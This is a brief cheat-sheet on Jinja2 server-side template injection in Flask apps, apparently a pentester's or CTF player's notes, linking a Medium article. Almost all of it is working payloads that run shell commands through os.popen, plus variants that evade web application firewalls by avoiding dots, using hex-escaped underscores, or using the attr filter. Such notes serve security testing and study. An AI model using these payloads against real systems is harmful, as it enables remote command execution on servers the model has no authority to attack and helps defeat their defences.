Python flask jinja2:

https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f

Simple payload:  
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}  

Bypassing filters:  
 - If the waf blocks **.**:  
     {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
 - If the waf blocks **.** and **_**:  
     {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
 - If the waf alsoblocks **request** and **[** and **]**
     {{''|attr('\x5f\x5fclass\x5f\x5f')}}
